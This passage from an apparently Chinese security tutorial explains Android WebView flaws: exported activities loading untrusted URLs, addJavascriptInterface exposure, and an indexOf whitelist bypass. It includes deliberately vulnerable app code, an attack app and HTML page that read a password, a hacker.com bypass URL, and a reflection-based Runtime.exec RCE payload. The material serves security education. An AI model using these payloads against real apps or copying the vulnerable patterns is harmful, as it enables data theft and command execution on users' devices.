        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Uri</span> getUri <span class="token operator">=</span> <span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>getUri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/**
     * 提供接口在Webview中供JS调用
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AndroidtoJs</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span>
        <span class="token annotation punctuation">@JavascriptInterface</span>
        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string">"admin123"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>在 AndroidMainfest.xml 中声明组件对外导出：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.webview.WebviewTestActivity<span class="token punctuation">"</span></span> 
          <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activity</span><span class="token punctuation">></span></span></code></pre>

<h2 id="本地攻击程序"><a href="#本地攻击程序" class="headerlink" title="本地攻击程序"></a>本地攻击程序</h2><p>在攻击程序 com.bwshen.attack 中编写如下攻击代码：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Button2</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token annotation punctuation">@Override</span>
      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token class-name">Intent</span> attackIntent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          attackIntent<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">"com.bwshen.test"</span><span class="token punctuation">,</span><span class="token string">"com.bwshen.test.webview.WebviewTestActivity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          attackIntent<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Uri</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"http://192.168.0.110:8080/attack.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">startActivity</span><span class="token punctuation">(</span>attackIntent<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>同时修改 attack.html：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>WebView Atack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
         <span class="token keyword">function</span> <span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span>
            <span class="token keyword">var</span> password <span class="token operator">=</span> test<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"getdata"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> password<span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getdata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>攻击获得的数据将显示在此……<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
   <span class="token comment">&lt;!--点击按钮则调用callAndroid函数--></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">callAndroid</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click Me for fun!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>页面效果如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b0643c729fe44a3689f51ce615b2a69b.png" alt="在这里插入图片描述" loading="lazy"><br>运行攻击程序，效果如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/cb7434502bcc467991c141628b5da7e8.png" alt="在这里插入图片描述" loading="lazy"><br>点击按钮，成功通过 JS 调用受害者 App 的敏感接口 getPassword 获得敏感数据：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/481c5e405fef4e93bcf8f9c7036a4cbe.png" alt="在这里插入图片描述" loading="lazy"><br>以上是 Local 本地攻击，可以借助 Deeplink 技术完全转换成远程攻击，参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/124550705">Android 应用层组件安全测试基础实战技巧</a>。</p>
<h2 id="url白名单校验"><a href="#url白名单校验" class="headerlink" title="url白名单校验"></a>url白名单校验</h2><p>综上可以看出，对于 WebView 组件，如果无脑调用 <code>webView.loadUrl(uri)</code> 加载外部可控的 URI，将导致 App 遭受外部攻击的风险。所以在加载外部传入的 URI 之前，应该进行白名单校验，对恶意、非法 URI 进行拦截。</p>
<p>但是需要注意的是，URI 白名单校验的方式经常存在被绕过的风险，比如以下代码：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">protected void onCreate<span class="token punctuation">(</span>Bundle savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ……
    Uri getUri <span class="token operator">=</span> getIntent<span class="token punctuation">(</span><span class="token punctuation">)</span>.getData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    String inputUrl <span class="token operator">=</span> String.valueOf<span class="token punctuation">(</span>getUri<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>checkDomain<span class="token punctuation">(</span>inputUrl<span class="token punctuation">))</span><span class="token punctuation">&#123;</span>
         webView.loadUrl<span class="token punctuation">(</span>inputUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

private static boolean checkDomain<span class="token punctuation">(</span>String inputUrl<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
     String<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token assign-left variable">whiteList</span><span class="token operator">=</span>new String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"site1.com"</span>,<span class="token string">"site2.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
     <span class="token keyword">for</span> <span class="token punctuation">(</span>String whiteDomain:whiteList<span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>inputUrl.indexOf<span class="token punctuation">(</span>whiteDomain<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
           <span class="token builtin class-name">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
     <span class="token builtin class-name">return</span>  <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p><strong>绕过方法</strong>：这个校验逻辑错误比较低级，攻击者直接输入 <code>http://www.hacker.com/poc.html?site1.com</code> 就可以绕过了。因为 URL 中除了代表域名的字段外，还有路径、参数等和域名无关的字段，因此直接判断整个 URL 是不安全的。虽然直接用 <code>indexOf</code> 来判断用户输入的 URL 是否在域名白名单内这种错误看上去比较 low，但是现实中仍然有不少缺乏安全意识的开发人员在使用。</p>
<p>上面介绍的是最简单的一种 URL 白名单校验及其绕过方式，更多校验方式及绕过方法请参见：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/201407.html">一文彻底搞懂安卓WebView白名单校验</a>，本文不再展开。</p>
<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><p>从上面的案例可以看到，JS 调用 Android 的其中一个方式是通过 <code>addJavascriptInterface</code> 接口进行对象映射：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//设置开启JS支持</span>
webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//往WebView中注入了一个Java对象，而这个Java对象的方法可以被js访问</span>
webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>而在 Android API 16 以及之前的版本，Webview 组件存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用 <code>WebView.addJavascriptInterface</code> 方法，远程攻击者可通过使用 Java Reflection API 利用该漏洞执行任意 Java 对象的方法，包括系统类（<code>java.lang.Runtime</code> 类），从而进行任意代码执行，如可以执行命令获取本地设备的 SD 卡中的文件等信息从而造成信息泄露。</p>
<p>【注意】WebView 任意代码执行漏洞有三种触发点<br>| 触发点                                                       | CVE编号       | 影响范围                        |<br>| ———————————————————— | ————- | ——————————- |<br>| WebView 中 addJavascriptInterface 接口                       | CVE-2012-6336 | Android &lt;= 4.1.2 (API level 16) |<br>| WebView 内置导出的 searchBoxJavaBridge_对象                  | CVE-2014-1939 | Android &lt;= 4.3.1                |<br>| WebView 内置导出的 accessibility 和 accessibilityTraversalObject 对象 | CVE-2014-7224 | Android &lt; 4.4                   |</p>
<p>本文只讨论第一种—— addJavascriptInterface 接口，简单的说就是通过 addJavascriptInterface 给 WebView 加入一个 JavaScript 桥接接口，JavaScript 通过调用这个接口在低版本的 Android 上可以直接无限制地随意操作本地的 JAVA 接口。</p>
<p><strong>漏洞触发前提</strong></p>
<ol>
<li>使用 addJavascriptInterface 方法注册可供 JavaScript 调用的 Java 对象；</li>
<li>使用 WebView 加载外部网页或者本地网页；</li>
<li>Android 系统版本低于 4.2（Android API level 小于17）。</li>
</ol>
<p><strong>获取系统类的大致流程</strong>：</p>
<ol>
<li>Android 中的对象有一公共的方法：getClass() ；</li>
<li>该方法可以获取到当前类的类型 Class；</li>
<li>该类有一关键的方法： Class.forName；</li>
<li>该方法可以加载一个类（可加载 java.lang.Runtime 类）；</li>
<li>而该类是可以执行本地命令的。</li>
</ol>
<h2 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a>JAVA反射机制</h2><p>JAVA 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为 Java 语言的反射机制。</p>
<p>反射，从这个“反”字可以看出与我们平时正常的使用逻辑肯定不一样，那么到底什么地方不一样了？想要了解“反”，就得先了解一下“正”的概念。在正常情况下，如果要使用一个类，必须要经过以下几个步骤：</p>
<ol>
<li>使用 import 导入类所在的包（类：java.lang.Class）；</li>
<li>通过关键字 new 进行类对象实例化（构造方法:java.lang.reflect.Constructor）；</li>
<li>产生对象可以使用“对象.属性”进行类中属性的调用(属性：java.lang.reflect.Field)；</li>
<li>通过“对象.方法()”调用类中的方法（方法：java.lang.reflect.Method）。</li>
</ol>
<p>括号中的补充字体对应的是每个步骤对应反射中使用到的类，在反射中使用一个类并不需要导入类的所在包，只要知道类的完整路径就可以知道该类中的所有信息。关于 Java 反射机制的理解，请参见 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/91956959">Java-反射机制</a>，本文也不展开。</p>
<p>直接来看一个简单的 Java 反射 Demo：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Tr0e</span><span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectInvokeDemo</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//获取Student类的Class对象</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.Tr0e.test.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class = "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//反射获取Student类的函数数组</span>
        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token operator">:</span>methods<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method = "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 实例化对象</span>
        <span class="token class-name">Object</span> obj <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//调用Student类的私有函数setName()方法，相当于Student对象.setName("Tr0e");</span>
        methods<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        methods<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"Tr0e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//调用getName()方法并输出</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,"</span> <span class="token operator">+</span> methods<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>程序运行结果如下所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/5162912c892d465e89d81c52a1b30db6.png" alt="在这里插入图片描述" loading="lazy"><br>Next，来看看如何借助上面的 Java 反射实现命令执行：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectInvokeDemo</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//获取Student类的Class对象</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.Tr0e.test.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Class = "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//反射获取Student类的函数数组</span>
        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token operator">:</span>methods<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method = "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">Class</span> c <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Method</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//第一个参数为类的实例，第二个参数为相应函数中的参数</span>
            <span class="token class-name">Object</span> obj <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Class</span> c2 <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> array <span class="token operator">=</span> <span class="token string">"cmd.exe /k start calc"</span><span class="token punctuation">;</span>
            <span class="token comment">//获得该类中名称为exec，参数类型为String的方法</span>
            <span class="token class-name">Method</span> n <span class="token operator">=</span> c2<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> array<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//调用方法n</span>
            n<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>array<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>程序运行结果，可以看到成功借助反射机制执行命令运行了本地计算器：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/00a32e1cb3764d98be25a08ad89b91ba.png" alt="在这里插入图片描述" loading="lazy"><br>有了以上的基础，我们知道，拿到 JAVA 对象之后，可以获取类对象，然后通过反射调用任意对象的任意方法。而在我们前面的 WebView 漏洞代码中，由于访问的页面是不可控的，所以在访问危险页面时，如果页面中的 js包含危险调用，如：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> execute<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    //jsObject是导出的Object
    <span class="token builtin class-name">return</span> window.jsObject.getClass<span class="token punctuation">(</span><span class="token punctuation">)</span>.forName<span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span>.getMethod<span class="token punctuation">(</span><span class="token string">"getRuntime"</span>,null<span class="token punctuation">)</span>.invoke<span class="token punctuation">(</span>null,null<span class="token punctuation">)</span>.exec<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>在 JS 中获得了 Webview 中导出的 Object，只要通过上述代码就可以进行反射并 RCE。早期的 Android 版本没有对可以访问的方法作限制，这就是该漏洞的根本成因。</p>
<h2 id="历史漏洞POC"><a href="#历史漏洞POC" class="headerlink" title="历史漏洞POC"></a>历史漏洞POC</h2><p>在检测某个 apk 是否包含此漏洞时，我们只需要让它访问一个页面，该页面中的 js 遍历其 windows 对象然后判定 getClass 函数是否存在即可。</p>
<p>POC 示例代码如下：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>WebView漏洞检测--捉虫猎手<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>
